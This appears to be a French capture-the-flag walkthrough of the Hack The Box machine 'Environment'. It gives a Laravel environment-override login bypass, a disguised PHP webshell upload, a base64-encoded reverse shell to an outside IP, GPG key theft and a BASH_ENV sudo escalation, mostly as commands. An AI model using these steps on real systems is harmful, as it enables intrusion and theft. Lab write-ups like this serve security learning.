  # Environment

	echo "10.10.11.67 environment.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.67 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.67 -oN nmap.txt
	feroxbuster --silent -u http://environment.htb
	
Scans classiques.

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
    | ssh-hostkey:
    |   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
    |_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
    80/tcp open  http    nginx 1.22.1
    |_http-title: Save the Environment | environment.htb
    |_http-server-header: nginx/1.22.1
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Dossiers et pages : 
```
http://environment.htb/build/assets/styles-Bl2K3jyg.css     
http://environment.htb/build/assets/login-CnECh1Us.css    
http://environment.htb/login                            
http://environment.htb/logout  
http://environment.htb/mailing       
http://environment.htb/          
http://environment.htb/upload     
http://environment.htb/up
http://environment.htb/storage   
http://environment.htb/storage/files   
http://environment.htb/build           
http://environment.htb/build/assets  
http://environment.htb/vendor 
[...]
```
    
On voit un /upload qui demande du POST mais ne marche pas mais il y a aussi un /login.

La page de login est vulnérable à un CVE de Laravel : 

- https://github.com/Nyamort/CVE-2024-52301

Intruder sur "http://environment.htb/login?--env=XYZ" et résultat positif pour "preprod" : 

    POST /login?--env=preprod HTTP/1.1

Une fois connecté on voit qu'on peut uploader une image comme prévu dans http://environment.htb/management/profile mais il y a une petite vérification sur le content-type et sur les magic bytes. 

Bypass : 

    Content-Disposition: form-data; name="upload"; filename="howitzer_shell.php."
    Content-Type: image/jpg

    GIF87a
    <?=`$_GET[0]`;
    
Réception du webshell puis du shell : 

    curl http://environment.htb/storage/files/howitzer_shell.php?0=ls
    curl http://environment.htb/storage/files/howitzer_shell.php?0=echo+c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMjMvOTk5OSAwPiYxCg%3d%3d+|+base64+-d+|+bash

    nc -nvlp 9999

On a le shell en tant que www-data mais il semble avoir les droits pour lire le premier flag : 

    cat /home/hish/user.txt

## Pivoting

Clé GPG de Hish dans son /home : 

    python3 -c "import pty ; pty.spawn('/bin/bash');"
    ls -la /home/hish/backup/keyvault.gpg
    
    cp -r /home/hish/.gnupg /tmp/cle_gpg
    chmod -R 700 /tmp/cle_gpg
    gpg --homedir /tmp/cle_gpg --list-secret-keys
    gpg --homedir /tmp/cle_gpg --output /tmp/message.txt --decrypt /home/hish/backup/keyvault.gpg
    cat /tmp/message.txt

    su hish 
    
## Élévation de privilèges

    sudo -l
    
> (ALL) /usr/bin/systeminfo

Simple script Bash où il y a une variable d'environnement ajoutée en dur : 

    [...]
    Matching Defaults entries for hish on environment:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
        env_keep+="ENV BASH_ENV", use_pty
    [...]
    
Bypass : 

    echo 'cat /root/root.txt' > root.sh
    sudo BASH_ENV=./root.sh /usr/bin/systeminfo 
